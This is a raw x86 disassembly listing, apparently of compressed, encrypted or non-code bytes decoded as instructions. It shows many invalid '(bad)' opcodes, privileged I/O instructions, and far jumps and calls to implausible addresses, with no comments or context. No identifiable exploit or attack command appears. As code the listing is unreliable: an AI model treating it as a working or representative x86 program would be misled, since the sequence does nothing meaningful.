  41c0d4:	fldenv [ebx+0x7d911ab2]
  41c0da:	dec    ecx
  41c0db:	icebp  
  41c0dc:	cwde   
  41c0dd:	dec    ecx
  41c0de:	fisubr DWORD PTR [ecx]
  41c0e0:	(bad)  
  41c0e1:	jmp    0x5c7:0x3b1e934
  41c0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0e9:	jge    0x41c0c1
  41c0eb:	push   ebp
  41c0ec:	iret   
  41c0ed:	int3   
  41c0ee:	jmp    0x2e90:0x1c9b8d7d
  41c0f5:	cmp    BYTE PTR [esi+0x25],0x46
  41c0f9:	sub    al,0xb9
  41c0fb:	jl     0x41c090
  41c0fd:	js     0x41c142
  41c0ff:	mov    ds,WORD PTR [edi+ebx*8]
  41c102:	sub    dl,BYTE PTR [edx-0x2507875a]
  41c108:	xchg   esp,eax
  41c109:	out    dx,al
  41c10a:	and    ebp,ebp
  41c10c:	cmp    al,0x45
  41c10e:	lock loopne 0x41c0cf
  41c111:	loopne 0x41c0cf
  41c113:	call   0x7638ba35
  41c118:	data16 mov bh,0xca
  41c11b:	push   eax
  41c11c:	or     eax,0x4e6f120c
  41c121:	(bad)
  41c124:	sbb    eax,0xf75a0dd1
  41c129:	xchg   edi,eax
  41c12a:	popa   
  41c12b:	or     dl,ah
  41c12d:	mov    al,ds:0xb8bd8b44
  41c132:	mov    bl,0x51
  41c134:	mov    dh,0xc5
  41c136:	inc    esi
  41c137:	or     DWORD PTR [ebx-0x795e8425],esp
  41c13d:	push   ss
  41c13e:	es cld 
  41c140:	cmp    BYTE PTR [ebp-0x43ec3de],cl
  41c146:	js     0x41c110
  41c148:	idiv   DWORD PTR [esi-0x27d2b7d]
  41c14e:	push   ds
  41c14f:	outs   dx,DWORD PTR ds:[esi]
  41c150:	or     bl,0xd2
  41c153:	xor    ecx,DWORD PTR [edi-0x38a098be]
  41c159:	loop   0x41c0e5
  41c15b:	pop    edx
  41c15c:	into   
  41c15d:	push   cs
  41c15e:	ret    0xcd0d
  41c161:	retf   
  41c162:	adc    DWORD PTR [esi],0x5fd2be66
  41c168:	sbb    DWORD PTR [ecx-0x493dfffa],esi
  41c16e:	mov    WORD PTR [ebx+0x55],cs
  41c171:	(bad)  
  41c172:	(bad)  
  41c173:	sti    
  41c174:	mov    edi,cs
  41c176:	push   ecx
  41c177:	out    0x66,al
  41c179:	add    al,0x77
  41c17b:	mov    al,0xb7
  41c17d:	mov    ds:0x5f860a2d,al
  41c182:	call   0x235c9116
  41c187:	jg     0x41c1a6
  41c189:	call   0x88be796c
  41c18e:	fmul   st,st(1)
  41c190:	mov    ds:0x1b12ebda,eax
  41c195:	or     eax,0xc161ee5f
  41c19a:	retf   0x84b
  41c19d:	pop    esi
  41c19e:	stos   BYTE PTR es:[edi],al
  41c19f:	adc    DWORD PTR [ecx],edx
  41c1a1:	push   esp
  41c1a2:	clc    
  41c1a3:	or     BYTE PTR [ecx-0x5a],dh
  41c1a6:	retf   0x16b9
  41c1a9:	push   ds
  41c1aa:	mov    edx,DWORD PTR [ebx+ecx*2-0x79]
  41c1ae:	test   eax,0xc3c2004e
  41c1b3:	fist   DWORD PTR [esi]
  41c1b5:	leave  
  41c1b6:	aad    0xcf
  41c1b8:	xchg   ebx,eax
  41c1b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1ba:	shl    DWORD PTR [edi+ecx*8],0x66
  41c1be:	pop    ss
  41c1bf:	adc    DWORD PTR [edx],ebx
  41c1c1:	xchg   BYTE PTR ds:0x4ca1129a,dl
  41c1c7:	mov    esi,0xb974bc49
  41c1cc:	and    DWORD PTR [ecx-0x590d2a42],edi
  41c1d2:	cmc    
  41c1d3:	adc    dl,bh
  41c1d5:	mov    eax,ds:0x77e2eed7
  41c1da:	popf   
  41c1db:	mov    fs,WORD PTR [edi+0x1d4aa68f]
  41c1e1:	jl     0x41c257
  41c1e3:	cmp    al,dl
  41c1e5:	xor    eax,0x5d37e422
  41c1ea:	or     edx,ebx
  41c1ec:	aas    
  41c1ed:	loop   0x41c18b
  41c1ef:	sbb    esp,DWORD PTR [ecx]
  41c1f1:	jl     0x41c258
  41c1f3:	inc    ebp
  41c1f4:	(bad)  
  41c1f5:	sar    DWORD PTR [eax],1
  41c1f7:	out    0xce,eax
  41c1f9:	shl    DWORD PTR [edx],1
  41c1fb:	and    BYTE PTR ds:0x4d914be6,dh
  41c201:	mov    ds:0x584571e9,eax
  41c206:	inc    esp
  41c207:	push   esp
  41c208:	mov    ecx,0x20d867df
  41c20d:	sub    bl,0xc1
  41c210:	pop    ecx
  41c211:	scas   al,BYTE PTR es:[edi]
  41c212:	push   0x6f57d635
  41c217:	test   DWORD PTR ds:0x8aed79bd,ecx
  41c21d:	mov    DWORD PTR [esi+0x17179c3e],ebx
  41c223:	nop
  41c224:	add    eax,0x6f78b66f
  41c229:	(bad)  
  41c22a:	adc    bh,al
  41c22c:	aaa    
  41c22d:	push   cs
  41c22e:	push   eax
  41c22f:	cdq    
  41c230:	sub    DWORD PTR [edx-0x1b3d9c98],edx
  41c236:	mov    ch,0xe7
  41c238:	inc    ebp
  41c239:	mov    ebx,0x502088c2
  41c23e:	fcomp  QWORD PTR [ebx-0x241e2523]
  41c244:	mov    ebx,0xc425e665
  41c249:	adc    BYTE PTR [esi],bh
  41c24b:	js     0x41c21d
  41c24d:	dec    edx
  41c24e:	jno    0x41c22d
  41c250:	xchg   edi,eax
  41c251:	pop    edx
  41c252:	ja     0x41c207
  41c254:	das    
  41c255:	adc    BYTE PTR [ebp-0x315f2cc0],cl
  41c25b:	add    BYTE PTR [edx],ah
  41c25d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c25e:	mov    eax,ds:0x8212aa6d
  41c263:	das    
  41c264:	ror    DWORD PTR [edx-0x79a64df9],cl
  41c26a:	out    0xd9,al
  41c26c:	mov    ecx,0x5e27ba66
  41c271:	les    ebx,FWORD PTR [eax]
  41c273:	sbb    eax,0xf0513261
  41c278:	and    eax,0x51e5197a
  41c27d:	int    0x0
  41c27f:	mov    cl,0xa2
  41c281:	or     bl,bl
  41c283:	mov    esi,DWORD PTR [ecx-0x66]
  41c286:	(bad)  
  41c287:	or     al,0x49
  41c289:	xchg   ebx,eax
  41c28a:	xchg   esp,eax
  41c28b:	pop    edx
  41c28c:	fstp   DWORD PTR [eax]
  41c28e:	adc    ebx,DWORD PTR [eax-0x18bfaf50]
  41c294:	daa    
  41c295:	pinsrw mm0,WORD PTR [ebp-0x5d],0x49
  41c29a:	cmp    al,0x37
  41c29c:	out    dx,eax
  41c29d:	aas    
  41c29e:	dec    esp
  41c29f:	sahf   
  41c2a0:	cwde   
  41c2a1:	clc    
  41c2a2:	and    eax,0xfd9d526d
  41c2a7:	mov    ebx,0x137b29f3
  41c2ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2ad:	dec    esp
  41c2ae:	push   cs
  41c2af:	fild   QWORD PTR [esi]
  41c2b1:	retf   
  41c2b2:	fild   WORD PTR [eax+esi*8]
  41c2b5:	sub    eax,0xabfc0ae6
  41c2ba:	sub    al,0x77
  41c2bc:	adc    eax,0xf95d7fa2
  41c2c1:	and    dl,dh
  41c2c3:	inc    edx
  41c2c4:	bound  edx,QWORD PTR [eax-0x3fde975f]
  41c2ca:	add    DWORD PTR ds:0x20989c6a,ecx
  41c2d0:	cwde   
  41c2d1:	inc    edi
  41c2d2:	add    esi,eax
  41c2d4:	sbb    bl,BYTE PTR [ebx-0x76]
  41c2d7:	jle    0x41c314
  41c2d9:	xor    eax,0x66173d0a
  41c2de:	mov    esp,0x93706ec9
  41c2e3:	push   eax
  41c2e4:	pop    esp
  41c2e5:	sub    DWORD PTR [edi-0x1d],ebx
  41c2e8:	out    0x3a,al
  41c2ea:	sbb    cl,bl
  41c2ec:	sti    
  41c2ed:	out    0xcc,al
  41c2ef:	mov    esi,0xa6a14f3f
  41c2f4:	hlt    
  41c2f5:	push   0xb3795599
  41c2fa:	mov    bh,0x5c
  41c2fc:	add    al,0xeb
  41c2fe:	xor    ebx,DWORD PTR [esi+0x2b]
  41c301:	jecxz  0x41c30a
  41c303:	xor    eax,DWORD PTR [esi+0x20]
  41c306:	clc    
  41c307:	jecxz  0x41c2fe
  41c309:	mov    DWORD PTR [ebx],esp
  41c30b:	adc    edx,esp
  41c30d:	mov    BYTE PTR [eax+esi*8-0x7f],cl
  41c311:	inc    edx
  41c312:	neg    DWORD PTR [edx+edx*8]
  41c315:	mov    edi,0xbcb1613b
  41c31a:	out    dx,al
  41c31b:	call   0x7cc469b
  41c320:	mov    al,0xcb
  41c322:	jle    0x41c2e5
  41c324:	ffreep st(5)
  41c326:	xchg   esi,eax
  41c327:	mov    DWORD PTR [ebp-0x77],eax
  41c32a:	int3   
  41c32b:	fwait
  41c32c:	inc    ecx
  41c32d:	dec    esp
  41c32e:	mov    ch,0xd4
  41c330:	mov    dh,0x3c
  41c332:	rcr    BYTE PTR [ebp+0x4d],0x58
  41c336:	mov    DWORD PTR [edi+0x35],esp
  41c339:	sub    ebp,DWORD PTR [ebx+edi*8+0x4c138b79]
  41c340:	das    
  41c341:	sbb    edx,DWORD PTR [edx]
  41c343:	fnsave [eax]
  41c345:	cmp    ch,ah
  41c347:	popf   
  41c348:	repnz cmc 
  41c34a:	mov    ah,0xe8
  41c34c:	sub    eax,0xd1d66ee
  41c351:	shl    BYTE PTR [ebp+0x9],cl
  41c354:	ret    0x7b7c
  41c357:	pop    ebx
  41c358:	lahf   
  41c359:	ins    BYTE PTR es:[edi],dx
  41c35a:	mov    esp,0x6e135906
  41c35f:	fdiv   DWORD PTR [ebp+edx*2-0x3ada991]
  41c366:	das    
  41c367:	pop    edx
  41c368:	jae    0x41c311
  41c36a:	nop
  41c36b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c36c:	stc    
  41c36d:	pop    eax
  41c36e:	jae    0x41c33d
  41c370:	xor    eax,ebx
  41c372:	dec    esp
  41c373:	cld    
  41c374:	stos   DWORD PTR es:[edi],eax
  41c375:	in     al,dx
  41c376:	adc    esp,DWORD PTR [esp+ebp*1-0x1]
  41c37a:	xchg   esp,eax
  41c37b:	iret   
  41c37c:	test   BYTE PTR [esi],0xc7
  41c37f:	sbb    BYTE PTR [edi-0x80],0xab
  41c383:	or     eax,0xba6de41b
  41c388:	aaa    
  41c389:	add    al,0xf6
  41c38b:	bound  esp,QWORD PTR [ecx+0x75]
  41c38e:	dec    ebp
  41c38f:	push   es
  41c390:	ret    
  41c391:	add    BYTE PTR [esi-0xc],ch
  41c394:	mov    esp,0x9c66a1da
  41c399:	std    
  41c39a:	aaa    
  41c39b:	fcomp  DWORD PTR [ebx+0x3]
  41c39e:	pop    ss
  41c39f:	dec    ebx
  41c3a0:	and    edi,DWORD PTR [esi-0x271aea64]
  41c3a6:	pusha  
  41c3a7:	mov    fs,WORD PTR [esi]
  41c3a9:	in     al,dx
  41c3aa:	xor    edi,DWORD PTR [ebx-0x5b4fc479]
  41c3b0:	gs adc ebx,ecx
  41c3b3:	fcmovb st,st(1)
  41c3b5:	iret   
  41c3b6:	call   0xea9a:0x7802a4ca
  41c3bd:	outs   dx,BYTE PTR ds:[esi]
  41c3be:	je     0x41c405
  41c3c0:	mov    eax,ds:0x87437d04
  41c3c5:	jle    0x41c42f
  41c3c7:	and    eax,0x75064120
  41c3cc:	pop    es
  41c3cd:	jmp    0x41c401
  41c3cf:	sub    esi,esp
  41c3d1:	sbb    ecx,DWORD PTR [eax]
  41c3d3:	inc    ebp
  41c3d4:	popa   
  41c3d5:	dec    edx
  41c3d6:	(bad)  
  41c3d7:	in     eax,0x64
  41c3d9:	pop    es
  41c3da:	dec    ebp
  41c3db:	mov    edx,0xae7b44c8
  41c3e0:	or     dl,BYTE PTR [esi+0x74]
  41c3e3:	enter  0x5280,0x5
  41c3e7:	and    al,0x90
  41c3e9:	push   ecx
  41c3ea:	mov    esp,0x7bef5bfc
  41c3ef:	mov    esp,0x32000533
  41c3f4:	mov    bl,0xbb
  41c3f6:	fdivr  DWORD PTR [edi-0x56]
  41c3f9:	jnp    0x41c463
  41c3fb:	inc    DWORD PTR [eax]
  41c3fd:	je     0x41c3cb
  41c3ff:	xlat   BYTE PTR ds:[bx]
  41c401:	mov    al,0xa3
  41c403:	test   ebp,eax
  41c405:	adc    edi,edx
  41c407:	jb     0x41c43f
  41c409:	inc    ebp
  41c40a:	xor    ch,dl
  41c40c:	xchg   edx,eax
  41c40d:	cdq    
  41c40e:	(bad)  
  41c40f:	imul   ecx,DWORD PTR [edi],0x15
  41c412:	loope  0x41c420
  41c414:	out    dx,eax
  41c415:	and    eax,0xc7ae8475
  41c41a:	icebp  
  41c41b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c41c:	mov    ds:0x7f93ef2d,eax
  41c421:	pop    edi
  41c422:	inc    ebx
  41c423:	fsubr  QWORD PTR [eax+0x66]
  41c426:	push   eax
  41c427:	aaa    
  41c428:	mov    eax,ds:0x789ff485
  41c42d:	sub    eax,0x56bea97f
  41c432:	or     DWORD PTR [edi-0xd30c6a6],edx
  41c438:	data16 mov dl,0x58
  41c43b:	test   eax,0xaf7b837a
  41c440:	mov    bh,cl
  41c442:	pusha  
  41c443:	pop    eax
  41c444:	leave  
  41c445:	fiadd  WORD PTR [ebp-0x499c6ff3]
  41c44b:	jno    0x41c4b4
  41c44d:	leave  
  41c44e:	call   0xa9bad4a9
  41c453:	jmp    0x322c475f
  41c458:	setns  BYTE PTR [ecx+0x10c01dc3]
  41c45f:	les    ebx,FWORD PTR [ecx-0x23]
  41c462:	and    dl,bl
  41c464:	inc    eax
  41c465:	std    
  41c466:	ror    BYTE PTR [edi+0x21],1
  41c469:	daa    
  41c46a:	pop    eax
  41c46b:	or     cl,al
  41c46d:	sbb    BYTE PTR [edi+0x348f0fd1],0x72
  41c474:	dec    ebx
  41c475:	cmc    
  41c476:	shl    BYTE PTR ds:[eax-0x5a],cl
  41c47a:	jl     0x41c41f
  41c47c:	pop    ebx
  41c47d:	cmp    al,0xaf
  41c47f:	dec    ecx
  41c480:	rcl    BYTE PTR [edi-0x64],cl
  41c483:	mov    dh,BYTE PTR [eax+ecx*2]
  41c486:	and    dl,al
  41c488:	mov    dl,0x9c
  41c48a:	mov    ah,0xea
  41c48c:	adc    BYTE PTR [ebx-0x1b],bl
  41c48f:	and    bl,BYTE PTR fs:[edi-0x26]
  41c493:	mov    ebp,DWORD PTR [ebp+0x344b8e03]
  41c499:	mov    DWORD PTR [eax],esi
  41c49b:	(bad)  
  41c49c:	retf   0x8016
  41c49f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4a0:	jmp    0xc915:0x7028be3e
  41c4a7:	inc    edx
  41c4a8:	sub    BYTE PTR [ebp+ebx*4+0x35],0xee
  41c4ad:	div    dh
  41c4af:	daa    
  41c4b0:	jo     0x41c4d1
  41c4b2:	into   
  41c4b3:	das    
  41c4b4:	or     BYTE PTR [ebx-0x78fbcd84],0x8a
  41c4bb:	cmp    esp,ecx
  41c4bd:	daa    
  41c4be:	aam    0xf1
  41c4c0:	pop    ebx
  41c4c1:	les    edx,FWORD PTR [esi]
  41c4c3:	in     eax,0x58
  41c4c5:	add    eax,0xbfbc79ea
  41c4ca:	jae    0x41c45c
  41c4cc:	dec    ebp
  41c4cd:	(bad)  
  41c4ce:	xor    BYTE PTR [ecx-0x39],ah
  41c4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4d2:	mov    eax,ds:0x88fd637e
  41c4d7:	mov    eax,ds:0xdc507085
  41c4dc:	pushf  
  41c4dd:	je     0x41c4c0
  41c4df:	fsubr  st(0),st
  41c4e1:	sub    bl,dl
  41c4e3:	arpl   WORD PTR [esi+0x19],cx
  41c4e6:	dec    ebx
  41c4e7:	and    edi,DWORD PTR [ebx]
  41c4e9:	add    eax,0x1d62620a
  41c4ee:	fwait
  41c4ef:	retf   
  41c4f0:	mov    DWORD PTR [ecx+0x50a4ad41],ebx
  41c4f6:	mov    DWORD PTR [eax+ecx*8-0x56],ebx
  41c4fa:	sbb    al,0x7a
  41c4fc:	fisttp QWORD PTR [edx+0x2e2be354]
  41c502:	test   BYTE PTR [ecx-0x45],bh
  41c505:	jns    0x41c54d
  41c507:	out    dx,eax
  41c508:	aaa    
  41c509:	popa   
  41c50a:	xchg   edi,eax
  41c50b:	xchg   edi,eax
  41c50c:	mov    al,0xea
  41c50e:	cld    
  41c50f:	xchg   esi,eax
  41c510:	clc    
  41c511:	jne    0x41c49f
  41c513:	lahf   
  41c514:	xchg   edi,eax
  41c515:	add    DWORD PTR [edx+0x313e0bea],0x8
  41c51c:	push   ecx
  41c51d:	dec    edi
  41c51e:	and    BYTE PTR [ebx+0x19f32f1f],dl
  41c524:	cmc    
  41c525:	mov    ds:0x66879cfc,al
  41c52a:	add    esp,ecx
  41c52c:	sub    DWORD PTR ds:0x200abb91,ecx
  41c532:	fcom   QWORD PTR [ecx-0x5059b28d]
  41c538:	out    dx,eax
  41c539:	iret   
  41c53a:	pop    ss
  41c53b:	mov    cl,0x3a
  41c53d:	cmp    BYTE PTR [ecx-0x67e9fa71],al
  41c543:	fisttp DWORD PTR [edi]
  41c545:	imul   esp,DWORD PTR [edx+0x73],0x5320ccdf
  41c54c:	dec    esp
  41c54d:	sbb    edx,ebx
  41c54f:	sub    DWORD PTR [ebx+0x4d5f3b3f],edi
  41c555:	mov    ebp,0x1b64a2fe
  41c55a:	and    BYTE PTR [esi-0xd784ba4],cl
  41c560:	sub    DWORD PTR [ebp+0x28],ebp
  41c563:	inc    edi
  41c564:	jnp    0x41c520
  41c566:	cmp    eax,0xd97cfd88
  41c56b:	outs   dx,BYTE PTR ds:[esi]
  41c56c:	or     ecx,DWORD PTR ds:0xdfbf89cd
  41c572:	adc    eax,0xfebb4c5f
  41c577:	mov    ch,0xce
  41c579:	add    BYTE PTR [edx+edx*8-0x2a],bl
  41c57d:	inc    ebx
  41c57e:	jecxz  0x41c5a5
  41c580:	push   ss
  41c581:	jmp    0x41c5b3
  41c583:	test   BYTE PTR [ecx+edx*4+0x16],dh
  41c587:	call   0xe9c1:0xca61a977
  41c58e:	out    0xc2,eax
  41c590:	or     bl,al
  41c592:	lods   al,BYTE PTR ds:[esi]
  41c593:	dec    ebp
  41c594:	inc    ebp
  41c595:	pushf  
  41c596:	jle    0x41c52c
  41c598:	xor    DWORD PTR [edx-0x75],ebx
  41c59b:	and    al,0xd2
  41c59d:	out    dx,al
  41c59e:	pop    esp
  41c59f:	sbb    esi,DWORD PTR [ebx]
  41c5a1:	jmp    0x3b4e64a7
  41c5a6:	lock lds eax,FWORD PTR [ebp-0x7b4a075c]
  41c5ad:	dec    esi
  41c5ae:	ret    0xf781
  41c5b1:	pushf  
  41c5b2:	repnz fwait
  41c5b4:	jl     0x41c5e4
  41c5b6:	pop    ecx
  41c5b7:	mov    esp,0xbf491ff0
  41c5bc:	popa   
  41c5bd:	retf   0xf080
  41c5c0:	inc    esp
  41c5c1:	jg     0x41c638
  41c5c3:	ins    DWORD PTR es:[edi],dx
  41c5c4:	data16 jno 0x41c579
  41c5c7:	aad    0xb1
  41c5c9:	addr16 xchg ecx,eax
  41c5cb:	mov    dh,0x32
  41c5cd:	ins    BYTE PTR es:[edi],dx
  41c5ce:	add    al,0x4b
  41c5d0:	rcr    esp,1
  41c5d2:	jl     0x41c5ab
  41c5d4:	xlat   BYTE PTR ds:[ebx]
  41c5d5:	fmulp  st(5),st
  41c5d7:	mov    WORD PTR [ebp+0x6ecf4bf3],es
  41c5dd:	test   DWORD PTR [ebx+ecx*4],0x5e336d8e
  41c5e4:	outs   dx,BYTE PTR ds:[esi]
  41c5e5:	push   ebp
  41c5e6:	scas   eax,DWORD PTR es:[edi]
  41c5e7:	mov    esp,0xcb3f5cc5
  41c5ec:	sar    DWORD PTR [ebx],1
  41c5ee:	xor    BYTE PTR [ecx+0x3a],ch
  41c5f1:	jne    0x41c5ec
  41c5f3:	mov    dh,BYTE PTR [ecx+0x16078e3d]
  41c5f9:	adc    ch,dh
  41c5fb:	and    al,0x67
  41c5fd:	(bad)
  41c602:	ja     0x41c61c
  41c604:	fst    DWORD PTR ds:0x5199853e
  41c60a:	sbb    al,0x4a
  41c60c:	pop    eax
  41c60d:	xchg   ebx,eax
  41c60e:	orps   xmm0,XMMWORD PTR [edi+eax*8+0x6f]
  41c613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c614:	rcr    BYTE PTR [ebx],1
  41c616:	outs   dx,DWORD PTR ds:[esi]
  41c617:	adc    al,0x31
  41c619:	(bad)  
  41c61a:	mov    edx,0xf93b322e
  41c61f:	leave  
  41c620:	add    esi,esi
  41c622:	pop    ecx
  41c623:	sbb    DWORD PTR [edx-0x52],edi
  41c626:	cmp    DWORD PTR [esi+0x7842b153],edi
  41c62c:	pop    edx
  41c62d:	pop    edx
  41c62e:	mov    edx,0x528d8e13
  41c633:	push   0x82c1632e
  41c638:	sub    ebp,DWORD PTR [ecx]
  41c63a:	(bad)  
  41c63b:	cmp    ecx,DWORD PTR [edx+0x36]
  41c63e:	pushf  
  41c63f:	sub    al,0x29
  41c641:	sub    BYTE PTR [ebx-0x14],0x92
  41c645:	pop    edx
  41c646:	inc    DWORD PTR [eax+0x5ee340f5]
  41c64c:	imul   esp,DWORD PTR [eax-0x11],0x1b
  41c650:	sub    BYTE PTR [esi],bl
  41c652:	push   ebx
  41c653:	push   edi
  41c654:	(bad)  
  41c655:	jno    0x41c692
  41c657:	adc    eax,0x4a68c61f
  41c65c:	mov    bh,cl
  41c65e:	(bad)  
  41c65f:	shl    ecx,1
  41c661:	(bad)  
  41c662:	cld    
  41c663:	jmp    0xb1e46bf
  41c668:	in     eax,dx
  41c669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c66a:	(bad)  
  41c66b:	lahf   
  41c66c:	daa    
  41c66d:	xor    eax,0x399b3c0b
  41c672:	mov    ecx,0x1d7d6b22
  41c677:	mov    esi,es
  41c679:	jns    0x41c5fd
  41c67b:	and    BYTE PTR [ebx],al
  41c67d:	pop    esp
  41c67e:	out    dx,eax
  41c67f:	popf   
  41c680:	sbb    DWORD PTR [ebx-0x7e],0x2a809498
  41c687:	dec    ebx
  41c688:	ins    BYTE PTR es:[edi],dx
  41c689:	ret    0x7bd0
  41c68c:	or     ebx,DWORD PTR [edx-0x3f]
  41c68f:	aam    0x7d
  41c691:	or     BYTE PTR [ebx],bh
  41c693:	retf   
  41c694:	push   es
  41c695:	jge    0x41c692
  41c697:	gs (bad) 
  41c699:	jmp    0x41c70e
  41c69b:	mov    fs,WORD PTR [ecx]
  41c69d:	pop    ebx
  41c69e:	pop    edx
  41c69f:	(bad)  [ecx-0xb]
  41c6a2:	jne    0x41c67a
  41c6a4:	inc    edx
  41c6a5:	mov    eax,0x99dcd6f2
  41c6aa:	or     ah,BYTE PTR [ecx+ebx*2+0x3b9819d1]
  41c6b1:	int3   
  41c6b2:	sbb    eax,DWORD PTR [esi-0x5607bb75]
  41c6b8:	push   esp
  41c6b9:	xchg   esp,eax
  41c6ba:	push   ss
  41c6bb:	xor    ebx,DWORD PTR [eax+0x7fc9710f]
  41c6c1:	cmp    eax,DWORD PTR [esi-0x17799205]
  41c6c7:	mov    eax,0xcf7052fc
  41c6cc:	fisttp WORD PTR [ecx]
  41c6ce:	je     0x41c6f2
  41c6d0:	jno    0x41c6eb
  41c6d2:	int3   
  41c6d3:	lods   eax,DWORD PTR ds:[esi]
  41c6d4:	jns    0x41c6e5
  41c6d6:	std    
  41c6d7:	add    esi,0x622701a4
  41c6dd:	inc    eax
  41c6de:	ss pop eax
  41c6e0:	xchg   ebx,eax
  41c6e1:	mov    DWORD PTR [ecx-0x1d914915],0x674c3d40
  41c6eb:	inc    edi
  41c6ec:	repnz outs dx,DWORD PTR ds:[esi]
  41c6ee:	pause  
  41c6f0:	xchg   edx,eax
  41c6f1:	adc    eax,DWORD PTR [edi]
  41c6f3:	mov    ds:0xf26b2338,eax
  41c6f8:	iret   
  41c6f9:	jecxz  0x41c6cb
  41c6fb:	in     eax,0x63
  41c6fd:	(bad)  
  41c6fe:	rcr    BYTE PTR [eax+0x153e12cf],1
  41c704:	add    DWORD PTR [ebx+eiz*8],edx
  41c707:	adc    al,0xbf
  41c709:	enter  0xc79e,0xef
  41c70d:	add    esp,DWORD PTR [ebx+0x59]
  41c710:	aad    0xf3
  41c712:	xchg   eax,ebx
  41c714:	lods   al,BYTE PTR ds:[esi]
  41c715:	pop    edx
  41c716:	sbb    DWORD PTR [ebx+0x6a],esi
  41c719:	ds mov ?,eax
  41c71c:	xor    DWORD PTR [ebx],ecx
  41c71e:	sbb    al,0xe6
  41c720:	xchg   edi,eax
  41c721:	(bad)  
  41c722:	cmc    
  41c723:	add    eax,0xad298cc2
  41c728:	jecxz  0x41c6f2
  41c72a:	xchg   ebx,eax
  41c72b:	and    BYTE PTR ds:0x640c667c,bl
  41c731:	cwde   
  41c732:	sbb    dh,dl
  41c734:	jbe    0x41c6d7
  41c736:	bound  ebp,QWORD PTR [edi-0x54558a2c]
  41c73c:	ja     0x41c773
  41c73e:	test   al,0xac
  41c740:	or     al,0x31
  41c742:	imul   ebx,esp,0xaefe8395
  41c748:	mov    edi,0xb9a1602a
  41c74d:	cmp    esi,DWORD PTR [ebx+0x6f]
  41c750:	test   al,0x9a
  41c752:	(bad)  
  41c753:	retf   
  41c754:	push   0x0
  41c756:	pop    edx
  41c757:	das    
  41c758:	dec    edi
  41c759:	pop    es
  41c75a:	cmp    ebp,esi
  41c75c:	inc    ecx
  41c75d:	push   eax
  41c75e:	jb     0x41c79d
  41c760:	xchg   ebp,eax
  41c761:	xchg   DWORD PTR [ebx+0x2f],edx
  41c764:	fisubr DWORD PTR [ebp-0x7e]
  41c767:	push   ebx
  41c768:	lods   al,BYTE PTR ds:[esi]
  41c769:	mov    ebx,0xe8695adc
  41c76e:	push   es
  41c76f:	mov    dh,0xe1
  41c771:	adc    ebp,ebx
  41c773:	dec    ecx
  41c774:	pop    ebp
  41c775:	add    al,0x66
  41c777:	in     eax,dx
  41c778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c779:	pop    ss
  41c77a:	xchg   edi,eax
  41c77b:	mov    ecx,0x235aec4f
  41c780:	push   es
  41c781:	leave  
  41c782:	outs   dx,DWORD PTR ds:[esi]
  41c783:	out    0x19,al
  41c785:	fwait
  41c786:	mul    DWORD PTR [esi+0x41]
  41c789:	cmp    ebx,DWORD PTR [ebx-0x1d]
  41c78c:	pop    ss
  41c78d:	add    al,BYTE PTR [edx]
  41c78f:	je     0x41c77d
  41c791:	ror    BYTE PTR [eax],1
  41c793:	or     BYTE PTR [edx+0x5a9c323b],bh
  41c799:	dec    ebx
  41c79a:	js     0x41c7c0
  41c79c:	sti    
  41c79d:	rcr    ebx,cl
  41c79f:	lods   eax,DWORD PTR ds:[esi]
  41c7a0:	inc    eax
  41c7a1:	nop
  41c7a2:	popf   
  41c7a3:	leave  
  41c7a4:	inc    esi
  41c7a5:	mov    al,0x9
  41c7a7:	ins    DWORD PTR es:[edi],dx
  41c7a8:	push   edi
  41c7a9:	cmp    ebx,eax
  41c7ab:	ins    DWORD PTR es:[edi],dx
  41c7ac:	push   ds
  41c7ad:	adc    al,0x5b
  41c7af:	mov    ebx,0xf5c71f96
  41c7b4:	inc    eax
  41c7b5:	push   cs
  41c7b6:	test   DWORD PTR [eax+0x28],esi
  41c7b9:	add    edi,DWORD PTR ds:0x6e7a9a43
  41c7bf:	jecxz  0x41c78d
  41c7c1:	adc    ah,BYTE PTR [ecx-0x49c5199]
  41c7c7:	clc    
  41c7c8:	or     BYTE PTR [ecx],ch
  41c7ca:	mov    edi,0x54c9c88c
  41c7cf:	ss inc edx
  41c7d1:	xchg   ebx,eax
  41c7d2:	push   ss
  41c7d3:	daa    
  41c7d4:	cld    
  41c7d5:	jle    0x41c776
  41c7d7:	ds push eax
  41c7d9:	out    dx,al
  41c7da:	aas    
  41c7db:	xchg   ebx,eax
  41c7dc:	mov    ebx,0x63fec962
  41c7e1:	xor    eax,DWORD PTR [edx]
  41c7e3:	sbb    ch,BYTE PTR ds:0x54d83347
  41c7e9:	dec    edi
  41c7ea:	bound  edx,QWORD PTR [edi+edi*4-0x5093c9c]
  41c7f1:	mov    dl,0x9a
  41c7f3:	aas    
  41c7f4:	and    eax,0xce880ac1
  41c7f9:	fadd   QWORD PTR [edx+0x37]
  41c7fc:	int    0xaf
  41c7fe:	stos   BYTE PTR es:[edi],al
  41c7ff:	fmul   st(5),st
  41c801:	or     al,0x41
  41c803:	mov    eax,DWORD PTR [edi]
  41c805:	out    0x36,al
  41c807:	jg     0x41c837
  41c809:	je     0x41c819
  41c80b:	inc    ebp
  41c80c:	lahf   
  41c80d:	or     eax,DWORD PTR [eax-0x54]
  41c810:	add    al,0x93
  41c812:	popa   
  41c813:	sub    DWORD PTR [ebp-0x74],ecx
  41c816:	push   esp
  41c817:	add    BYTE PTR [edx],al
  41c819:	hlt    
  41c81a:	mov    dl,0x4
  41c81c:	ins    BYTE PTR es:[edi],dx
  41c81d:	jle    0x41c7e6
  41c81f:	or     al,0x67
  41c821:	sbb    BYTE PTR [esi],ah
  41c823:	sbb    dl,ah
  41c825:	push   ecx
  41c826:	push   0x382171eb
  41c82b:	jp     0x41c84c
  41c82d:	shr    DWORD PTR [ebx+0x69390858],cl
  41c833:	cmp    DWORD PTR [edx],esi
  41c835:	push   DWORD PTR [edx]
  41c837:	push   ebx
  41c838:	mov    eax,ds:0x42c24e89
  41c83d:	shr    ch,1
